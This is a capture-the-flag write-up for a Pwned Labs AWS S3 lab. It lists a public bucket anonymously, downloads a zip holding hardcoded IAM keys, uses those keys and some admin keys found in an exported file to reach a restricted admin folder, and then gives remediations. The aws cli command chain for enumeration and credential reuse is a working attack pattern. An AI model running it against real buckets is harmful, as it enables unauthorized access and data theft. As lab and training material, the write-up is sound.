https://pwnedlabs.io/labs/aws-s3-enumeration-basics

---
## Vulnerability Summary
The environment is vulnerable to information disclosure due to over-permissive S3 bucket configurations and the presence of sensitive credentials within publicly accessible project files.

1. **Public Bucket Exposure**: The S3 bucket was configured with overly permissive public access, allowing unauthenticated listing of its contents via `aws s3 ls`.
2. **Exposure of Sensitive Files**: A publicly downloadable ZIP archive (`hl_migration_project.zip`) was stored in a world-readable directory, which contained hardcoded AWS IAM credentials.
3. **Privilege Escalation**: By utilizing the exfiltrated credentials, the attacker gained authorized access to restricted sub-directories (`/admin/`) within the same bucket.
4. **Data Exfiltration**: Access to the `/admin/` directory facilitated the retrieval of critical infrastructure files and flags, demonstrating the impact of cascading credential exposure.

---
## Walkthrough
Inspect webpage to find the s3 bucket:
	`http://s3.amazonaws.com/dev.huge-logistics.com`

We can manually traverse these buckets, but we will get `AccessDenied`. Instead, try the `aws` cli:
```bash
aws s3 ls s3://dev.huge-logistics.com --no-sign-request
	                       PRE admin/
                           PRE migration-files/
                           PRE shared/
                           PRE static/
2023-10-16 10:00:47       5347 index.html
```

Most of these also result in `AccessDenied` except for `shared/` which has a `zip` file we can download:
```bash
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
unzip hl_migration_project.zip
```

This zip has `migrate_secrets.ps1` which contains AWS access key, secret key, and region. We use those to configure our `aws` cli and then `get-caller-identity`
```bash
head migrate_secrets.ps1
aws configure --profile pam
aws sts get-caller-identity --profile pam
```

We could also get the region with:
```bash
curl -I https://s3.amazonaws.com/dev.huge-logistics.com/
```

Now we can enumerate those folders more and download them:
```bash
aws s3 ls s3://dev.huge-logistics.com/migration-files/ --profile pam
aws s3 cp s3://dev.huge-logistics.com/migration-files/ . --recursive --profile pam
```

The `test-export.xml` has `AWS IT Admin` AWS keys. Configure them to a new profile and authenticate to that `/admin` folder:
```bash
strings test-export.xml
aws configure --profile admin
aws sts get-caller-identity --profile admin
aws s3 ls s3://dev.huge-logistics.com/ --profile admin
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt . --profile admin
```

---
## Remediations
1. **Apply Least Privilege**: Use S3 Bucket Policies to strictly enforce access controls. Avoid `s3:ListBucket` or `s3:GetObject` permissions for unauthenticated (`no-sign-request`) users unless the bucket is specifically intended to host static public assets.
2. **Prevent Credential Leakage**:
   - Conduct regular scans of storage buckets to ensure no sensitive files (e.g., `.zip`, `.ps1`, `.xml`) containing plaintext secrets are present.
   - Implement automated pre-commit hooks or CI/CD pipeline checks to prevent developers from committing hardcoded keys to project files.
3. **Bucket Hardening**: 
   - Enable `S3 Block Public Access` settings at both the account and bucket levels to prevent accidental public exposure.
4. **Monitoring**:
   - Utilize `AWS CloudTrail` to log and alert on unusual `s3:ListBucket` or `s3:GetObject` calls coming from unauthorized or unexpected IP ranges.
   - Implement `Amazon Macie` to automatically discover and protect sensitive data stored in S3.